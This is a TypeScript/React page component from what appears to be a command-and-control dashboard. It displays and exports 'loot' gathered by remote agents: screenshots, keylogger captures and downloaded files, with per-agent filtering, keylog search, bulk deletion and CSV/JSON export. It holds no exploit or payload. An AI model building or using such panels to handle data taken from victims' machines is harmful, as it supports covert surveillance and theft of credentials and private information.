"use client";

import { useEffect, useState, useCallback } from "react";
import { api } from "@/lib/api";
import { toast } from "sonner";
import { downloadText, downloadJSON } from "@/lib/download";
import { useI18n } from "@/lib/i18n";
import { formatTime } from "@/lib/utils";
import { ConfirmModal, EmptyState, PageHeader, StatusBadge } from "@/components/UI";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import { Skeleton } from "@/components/ui/skeleton";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Label } from "@/components/ui/label";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Download, FileUp, Images, Keyboard, Terminal, Trash2, X } from "lucide-react";
import { Accordion, AccordionItem, AccordionHeader, AccordionTrigger, AccordionPanel } from "@/components/ui/accordion";
import type { Screenshot } from "@/types/screenshot";
import type { KeylogTask, DownloadTask, LootData } from "@/types/loot";

type LootTab = "screenshots" | "keylogs" | "downloads";

export default function LootPage() {
  const { t } = useI18n();
  const [data, setData] = useState<LootData | null>(null);
  const [loading, setLoading] = useState(true);
  const [modalImg, setModalImg] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<LootTab>("screenshots");
  const [agentFilter, setAgentFilter] = useState("");
  const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
  const [keylogSearch, setKeylogSearch] = useState("");
  const [cfm, setCfm] = useState<{msg: string; cb: () => void} | null>(null);

  const loadLoot = useCallback(async () => {
    setLoading(true);
    try {
      const result = await api.get("/loot");
      setData({
        screenshots: (result.screenshots || []) as Screenshot[],
        keylog_tasks: (result.keylog_tasks || result.keylogs || []) as KeylogTask[],
        download_tasks: (result.download_tasks || result.downloads || []) as DownloadTask[],
      });
    } catch {
      setData({ screenshots: [], keylog_tasks: [], download_tasks: [] });
      toast.error(t("loot.toast.load_failed"));
    }
    setLoading(false);
  }, [t]);

  useEffect(() => { loadLoot(); }, [loadLoot]);

  const filteredScreenshots = data?.screenshots?.filter(s => !agentFilter || s.agent_id === agentFilter) || [];
  const filteredKeylogs = data?.keylog_tasks?.filter(k => {
    if (agentFilter && k.agent_id !== agentFilter) return false;
    if (keylogSearch) {
      const q = keylogSearch.toLowerCase();
      const content = (k.result || k.error || "").toLowerCase();
      const agent = (k.agent?.hostname || k.hostname || k.agent_id || "").toLowerCase();
      if (!content.includes(q) && !agent.includes(q)) return false;
    }
    return true;
  }) || [];
  const filteredDownloads = data?.download_tasks?.filter(d => !agentFilter || d.agent_id === agentFilter) || [];

  const allAgents = [...new Set([
    ...(data?.screenshots?.map(s => s.agent_id) || []),
    ...(data?.keylog_tasks?.map(k => k.agent_id) || []),
    ...(data?.download_tasks?.map(d => d.agent_id) || []),
  ])];

  const toggleSelect = (id: string) => {
    const next = new Set(selectedItems);
    if (next.has(id)) next.delete(id); else next.add(id);
    setSelectedItems(next);
  };

  const toggleSelectAll = () => {
    let items: string[] = [];
    if (activeTab === "screenshots") items = filteredScreenshots.map(s => s.id);
    else if (activeTab === "downloads") items = filteredDownloads.map(d => d.id);
    const allSelected = items.every(id => selectedItems.has(id));
    const next = new Set(selectedItems);
    if (allSelected) items.forEach(id => next.delete(id));
    else items.forEach(id => next.add(id));
    setSelectedItems(next);
  };

  const deleteSelected = () => {
    if (selectedItems.size === 0) return;
    setCfm({msg: `Delete ${selectedItems.size} selected items?`, cb: async () => {
      try {
        await api.postJson("/loot/bulk-delete", { ids: [...selectedItems] });
        setSelectedItems(new Set());
        loadLoot();
      } catch { toast.error(t("loot.toast.delete_failed")); }
    }});
  };

  const exportAll = (format: "json" | "csv" = "json") => {
    const exportData = {
      screenshots: filteredScreenshots,
      keylogs: filteredKeylogs,
      downloads: filteredDownloads,
    };
    if (format === "csv") {
      const rows: string[] = ["Type,Agent,Filename,Path,Created"];
      for (const s of filteredScreenshots) {
        rows.push(`screenshot,${s.agent_id},"${s.filename}","${s.path}",${s.created_at}`);
      }
      for (const k of filteredKeylogs) {
        rows.push(`keylog,${k.agent_id},"","","${k.created_at}"`);
      }
      for (const d of filteredDownloads) {
        rows.push(`download,${d.agent_id},"${d.command}","${d.result}",${d.created_at}`);
      }
      downloadText(rows.join("\n"), `loot-export-${new Date().toISOString().slice(0, 10)}.csv`, "text/csv");
    } else {
      downloadJSON(exportData, `loot-export-${new Date().toISOString().slice(0, 10)}.json`);
    }
  };

  const formatBytes = (str: string) => {
    const size = (str || "").length;
    if (size < 1024) return size + " B";
    return (size / 1024).toFixed(1) + " KB";
  };

  const tabs: { key: LootTab; label: string; icon: React.ReactNode; count: number }[] = [
    { key: "screenshots", label: t("loot.screenshots_tab"), icon: <Images className="w-4 h-4" />, count: filteredScreenshots.length },
    { key: "keylogs", label: t("loot.keylogs_tab"), icon: <Keyboard className="w-4 h-4" />, count: filteredKeylogs.length },
    { key: "downloads", label: t("loot.downloads_tab"), icon: <Download className="w-4 h-4" />, count: filteredDownloads.length },
  ];

  return (
    <div className="max-w-(--content-width) mx-auto pb-12 md:pb-0 animate-fade-slide-up">
      <PageHeader title={t("loot.page_title")} subtitle={t("loot.subtitle")}>
        <div className="flex items-center gap-2 flex-wrap">
          <Select value={agentFilter || "all"} onValueChange={(v) => { setAgentFilter(v === "all" ? "" : v ?? ""); setSelectedItems(new Set()); }}>
            <SelectTrigger className="w-full sm:w-48" aria-label="Filter by agent"><SelectValue placeholder={t("loot.all_agents")} /></SelectTrigger>
            <SelectContent>
              <SelectItem value="all">{t("loot.all_agents")}</SelectItem>
              {allAgents.map(a => <SelectItem key={a} value={a}>{a.substring(0, 12)}</SelectItem>)}
            </SelectContent>
          </Select>
          <Button onClick={() => exportAll("json")} className="gap-1">
            <FileUp className="w-4 h-4" /> {t("loot.export_json")}
          </Button>
          <Button variant="outline" onClick={() => exportAll("csv")} className="gap-1">
            <FileUp className="w-4 h-4" /> {t("loot.export_csv")}
          </Button>
          {selectedItems.size > 0 && (
            <Button variant="destructive" onClick={deleteSelected} className="gap-1">
              <Trash2 className="w-4 h-4" /> {t("loot.delete_selected", { count: selectedItems.size })}
            </Button>
          )}
        </div>
      </PageHeader>

      <Tabs value={activeTab} onValueChange={(v) => { setActiveTab(v as LootTab); setSelectedItems(new Set()); }}>
        <TabsList className="mb-4">
          {tabs.map(tab => (
            <TabsTrigger key={tab.key} value={tab.key} className="gap-2">
              {tab.icon}
              <span>{tab.label}</span>
              <Badge variant={activeTab === tab.key ? "default" : "secondary"}>{tab.count}</Badge>
            </TabsTrigger>
          ))}
        </TabsList>

      <TabsContent value="screenshots">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold flex items-center gap-x-2">
              <Images className="w-4 h-4" />
              <span>{t("loot.screenshots_title")}</span>
            </div>
            <div className="flex items-center gap-3">
              {filteredScreenshots.length > 0 && (
                <Label className="flex items-center gap-x-2 text-xs text-muted-foreground cursor-pointer">
                  <Checkbox checked={filteredScreenshots.length > 0 && filteredScreenshots.every(s => selectedItems.has(s.id))} onCheckedChange={toggleSelectAll} aria-label="Select all screenshots" />
                  {t("loot.select_all")}
                </Label>
              )}
              <span className="text-xs text-muted-foreground">{filteredScreenshots.length}</span>
            </div>
          </div>
          {loading ? (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-2">
              {Array.from({ length: 8 }).map((_, i) => (
                <Skeleton key={i} className="rounded-xl border border-border h-24" />
              ))}
            </div>
          ) : filteredScreenshots.length > 0 ? (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-3">
              {filteredScreenshots.map(s => (
                <div key={s.id} className={`group relative rounded-xl overflow-hidden border-2 cursor-pointer bg-muted/50 ${selectedItems.has(s.id) ? "border-indigo-500 ring-2 ring-indigo-200 dark:ring-indigo-800" : "border-border"}`}
                  onClick={() => setModalImg(`/screenshots/${s.path}`)}>
                  <div className="absolute top-1.5 left-1.5 z-10" onClick={e => { e.stopPropagation(); toggleSelect(s.id); }}>
                    <Checkbox checked={selectedItems.has(s.id)} aria-label={`Select screenshot ${s.filename}`} className="bg-secondary/90" />
                  </div>
                  <img src={`/screenshots/${s.path}`} alt={s.filename} className="w-full h-24 object-contain bg-background" loading="lazy" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                  <div className="absolute bottom-0 left-0 right-0 bg-black/60 text-(--font-size-micro-sm) text-white px-2 py-1 opacity-0 group-hover:opacity-100 transition flex justify-between items-center">
                    <span className="truncate">{s.agent_id.substring(0, 8)}</span>
                    <a href={`/screenshots/${s.path}`} download onClick={e => e.stopPropagation()} className="hover:text-primary dark:hover:text-emerald-300 px-1 transition-colors"><Download className="w-4 h-4" /></a>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="text-center py-12 text-muted-foreground">
              <EmptyState icon={Images} title={t("loot.empty_screenshots")} />
            </div>
          )}
        </Card>
      </TabsContent>

      <TabsContent value="keylogs">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4 gap-2">
            <div className="font-semibold flex items-center gap-x-2">
              <Keyboard className="w-4 h-4" />
              <span>{t("loot.keylogs_title")}</span>
            </div>
            <div className="flex items-center gap-2">
              <Input placeholder={t("loot.search_keylogs")} value={keylogSearch} onChange={e => setKeylogSearch(e.target.value)} className="h-8 w-48 text-xs" />
              <span className="text-xs text-muted-foreground">{filteredKeylogs.length}</span>
            </div>
          </div>
          {loading ? (
            <div className="space-y-3">
              {[1, 2].map(i => (
                <div key={i} className="border border-border rounded-xl p-4">
                  <Skeleton className="h-3 w-32 mb-2" />
                  <Skeleton className="h-20" />
                </div>
              ))}
            </div>
          ) : filteredKeylogs.length > 0 ? (
            <div className="space-y-3">
              <Accordion>
                {filteredKeylogs.map(k => {
                  const agentName = k.agent?.hostname || k.hostname || k.agent_id;
                  const full = k.result || k.error;
                  return (
                    <AccordionItem key={k.id} value={k.id} className="border border-border rounded-xl overflow-hidden mb-3">
                      <AccordionHeader className="bg-muted/50">
                        <AccordionTrigger className="px-4 py-2 hover:bg-muted/80 flex-1">
                          <div className="flex items-center justify-between w-full">
                            <div className="flex items-center gap-x-3">
                              <Terminal className="w-4 h-4" />
                              <span className="font-medium text-sm">{agentName}</span>
                            </div>
                            <div className="flex items-center gap-x-3" onClick={e => e.stopPropagation()}>
                              <span className="text-xs text-muted-foreground">{formatTime(k.created_at)}</span>
                              <Button variant="ghost" size="sm" onClick={() => downloadText(full, `keylog-${agentName}-${k.id}.txt`)} className="text-xs h-auto p-1 text-primary hover:text-emerald-700"><Download className="w-4 h-4" /></Button>
                            </div>
                          </div>
                        </AccordionTrigger>
                      </AccordionHeader>
                      <AccordionPanel>
                        <div className="bg-background text-emerald-700 dark:text-emerald-300 font-mono text-xs p-4 max-h-[500px] overflow-y-auto whitespace-pre-wrap break-all">
                          {full}
                        </div>
                      </AccordionPanel>
                    </AccordionItem>
                  );
                })}
              </Accordion>
            </div>
          ) : (
            <div className="text-center py-12 text-muted-foreground">
              <EmptyState icon={Keyboard} title={t("loot.empty_keylogs")} />
            </div>
          )}
        </Card>
      </TabsContent>

      <TabsContent value="downloads">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold flex items-center gap-x-2">
              <Download className="w-4 h-4" />
              <span>{t("loot.downloads_title")}</span>
            </div>
            <span className="text-xs text-muted-foreground">{filteredDownloads.length}</span>
          </div>
          {loading ? (
            <div className="space-y-2">
              {[1, 2, 3].map(i => (
                <Skeleton key={i} className="h-10" />
              ))}
            </div>
          ) : filteredDownloads.length > 0 ? (
            <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>{t("loot.time")}</TableHead>
                  <TableHead>{t("loot.file_path")}</TableHead>
                  <TableHead>{t("loot.source")}</TableHead>
                  <TableHead>{t("loot.size")}</TableHead>
                  <TableHead>{t("loot.status")}</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredDownloads.map(d => (
                  <TableRow key={d.id}>
                    <TableCell className="font-mono text-xs text-muted-foreground">{formatTime(d.created_at)}</TableCell>
                    <TableCell><span className="font-medium text-xs">{d.agent?.hostname || d.hostname || d.agent_id.substring(0, 8)}</span></TableCell>
                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[200px] truncate">{d.command}</TableCell>
                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[300px] truncate">{d.result || "-"}</TableCell>
                    <TableCell className="text-xs text-muted-foreground">{formatBytes(d.result || "")}</TableCell>
                    <TableCell><StatusBadge status={d.status} /></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
            </div>
          ) : (
            <EmptyState icon={Download} title={t("loot.empty_downloads")} />
          )}
        </Card>
      </TabsContent>
      </Tabs>

      {modalImg && (
        <Dialog open={true} onOpenChange={() => setModalImg(null)}>
          <DialogContent className="max-w-4xl bg-transparent border-0 p-0" showCloseButton={false}>
            <div className="absolute top-4 right-4 flex gap-2 z-10">
              <a href={modalImg} download>
                <Button variant="secondary" className="gap-1"><Download className="w-4 h-4" />Download</Button>
              </a>
              <Button variant="secondary" onClick={() => setModalImg(null)} className="w-10 h-10 p-0" aria-label="Close screenshot">
                <X className="w-4 h-4" />
              </Button>
            </div>
            <img src={modalImg} alt="Screenshot" className="max-w-[95vw] max-h-[90vh] object-contain rounded-xl shadow-2xl" loading="lazy" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </DialogContent>
        </Dialog>
      )}
      <ConfirmModal open={!!cfm} title={t("common.confirm")} message={cfm?.msg || ""} confirmText={t("common.delete")} cancelText={t("common.cancel")} danger onConfirm={() => { cfm?.cb(); setCfm(null); }} onCancel={() => setCfm(null)} />
    </div>
  );
}

